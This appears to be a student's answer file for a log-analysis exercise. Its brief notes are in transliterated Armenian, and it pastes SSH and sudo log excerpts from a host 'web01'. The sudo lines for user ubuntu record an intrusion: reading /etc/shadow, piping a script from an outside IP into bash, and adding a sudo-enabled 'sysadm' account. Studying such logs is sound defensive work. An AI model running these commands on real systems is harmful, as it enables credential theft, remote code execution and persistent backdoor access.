@@ -1,0 +1,99 @@
+---part 1 A answers---
+1.286
+2.Disconnecting authenticating user ,pam_unix(sshd:auth),pidneri mijococv erevum e ham el failed passneri mej nuyn eventy
+3.authentication 
+4/5.che nuyn infoyic 2x kliner,uxxaki amen hamakarg barandzin ira logerna pahum
+
+---part 3---
+1.187 203.0.113.7
+     63 198.51.100.23
+     29 192.0.2.88
+      3 10.0.12.51
+      2 10.0.20.9
+2.124
+3.This block is reserved for use in documentation and
+remarks:        should not be used in any real networks.
+remarks:        Please see more details at
+remarks:        http://www.iana.org/go/rfc5737
+4.verji 2y karox en linel uxxaki sxal pass grelu ardyunq,brute force kam ayl harcakumneri jmnk attemptneri qanaky meca linum
+
+---part a4---
+1.Sep 14 02:05:35 web01 sshd[26172]: Accepted publickey for deploy from 10.0.20.9 port 58675 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+Sep 14 02:14:09 web01 sshd[26189]: Accepted password for alice from 10.0.12.34 port 60217 ssh2
+Sep 14 02:35:14 web01 sshd[26236]: Accepted publickey for deploy from 10.0.20.9 port 52541 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+Sep 14 03:05:40 web01 sshd[26320]: Accepted publickey for deploy from 10.0.20.9 port 53296 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+Sep 14 03:15:52 web01 sshd[27134]: Accepted password for ubuntu from 203.0.113.7 port 51902 ssh2
+Sep 14 03:32:29 web01 sshd[27215]: Accepted password for deploy from 10.0.20.9 port 56029 ssh2
+Sep 14 03:35:12 web01 sshd[27232]: Accepted publickey for deploy from 10.0.20.9 port 57404 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+Sep 14 03:45:40 web01 sshd[27256]: Accepted password for alice from 10.0.12.34 port 56332 ssh2
+Sep 14 03:49:14 web01 sshd[27295]: Accepted password for bob from 10.0.12.51 port 54941 ssh2
+Sep 14 04:05:07 web01 sshd[27365]: Accepted publickey for deploy from 10.0.20.9 port 58178 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+Sep 14 04:35:11 web01 sshd[27426]: Accepted publickey for deploy from 10.0.20.9 port 57072 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+2.from failed 
+Sep 14 03:15:48 web01 sshd[27130]: Failed password for root from 203.0.113.7 port 51838 ssh2
+Sep 14 03:49:04 web01 sshd[27294]: Failed password for bob from 10.0.12.51 port 52784 ssh2
+Sep 14 03:32:23 web01 sshd[27200]: Failed password for deploy from 10.0.20.9 port 52753 ssh2
+
+from accepted 
+Sep 14 03:15:52 web01 sshd[27134]: Accepted password for ubuntu from 203.0.113.7 port 51902 ssh2
+Sep 14 04:35:11 web01 sshd[27426]: Accepted publickey for deploy from 10.0.20.9 port 57072 ssh2: ED25519 SHA256:kDJkeW+Hq+tw3CLdxXHPcex42Fbdp7sCqknRSTI8CML
+Sep 14 03:49:14 web01 sshd[27295]: Accepted password for bob from 10.0.12.51 port 54941 ssh2
+
+3.Sep 14 02:06:36 web01 sudo:    deploy : TTY=unknown ; PWD=/srv/app/current ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Sep 14 02:06:36 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+Sep 14 02:36:44 web01 sudo:    deploy : TTY=unknown ; PWD=/srv/app/current ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Sep 14 02:36:44 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+Sep 14 03:33:21 web01 sudo:    deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
+Sep 14 03:33:21 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+Sep 14 03:35:28 web01 sudo:    deploy : TTY=unknown ; PWD=/srv/app/current ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Sep 14 03:35:28 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+Sep 14 03:36:20 web01 sudo:    deploy : TTY=unknown ; PWD=/srv/app/current ; USER=root ; COMMAND=/usr/bin/systemctl restart app.service
+Sep 14 03:36:20 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+Sep 14 04:05:48 web01 sudo:    deploy : TTY=unknown ; PWD=/srv/app/current ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Sep 14 04:05:48 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+Sep 14 04:36:38 web01 sudo:    deploy : TTY=unknown ; PWD=/srv/app/current ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Sep 14 04:36:38 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1004)
+
+----------------------------------------
+Sep 14 02:15:30 web01 sudo:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 14 02:15:30 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 02:19:51 web01 sudo:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+Sep 14 02:19:51 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 02:23:37 web01 sudo:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx --since today
+Sep 14 02:23:37 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 02:24:59 web01 sudo:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Sep 14 02:24:59 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 03:46:16 web01 sudo:     alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 500 /var/log/auth.log
+Sep 14 03:46:16 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 03:51:08 web01 sudo:     alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/ss -tnp
+Sep 14 03:51:08 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 03:56:32 web01 sudo:     alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/last -a
+Sep 14 03:56:32 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 04:05:49 web01 sudo:     alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/ufw status verbose
+Sep 14 04:05:49 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+Sep 14 04:09:37 web01 sudo:     alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status ssh
+Sep 14 04:09:37 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1001)
+
+----------------------------------------
+Sep 14 03:16:28 web01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/id
+Sep 14 03:16:28 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Sep 14 03:17:22 web01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 14 03:17:22 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Sep 14 03:18:09 web01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/bash -c curl -s http://185.220.101.47/x.sh | bash
+Sep 14 03:18:09 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Sep 14 03:18:51 web01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysadm
+Sep 14 03:18:51 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Sep 14 03:19:39 web01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/passwd sysadm
+Sep 14 03:19:39 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Sep 14 03:20:37 web01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysadm
+Sep 14 03:20:37 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+------------------------------------------------
+
+ep 14 03:49:42 web01 sudo:       bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status ssh
+Sep 14 03:49:42 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by bob(uid=1002)
+Sep 14 03:55:38 web01 sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1002 euid=0 tty=/dev/pts/2 ruser=bob rhost=  user=bob
+Sep 14 03:55:44 web01 sudo:       bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/less /var/log/syslog
+Sep 14 03:55:44 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by bob(uid=1002)
+Sep 14 03:57:16 web01 sudo:       bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/df -h
+Sep 14 03:57:16 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by bob(uid=1002)
+
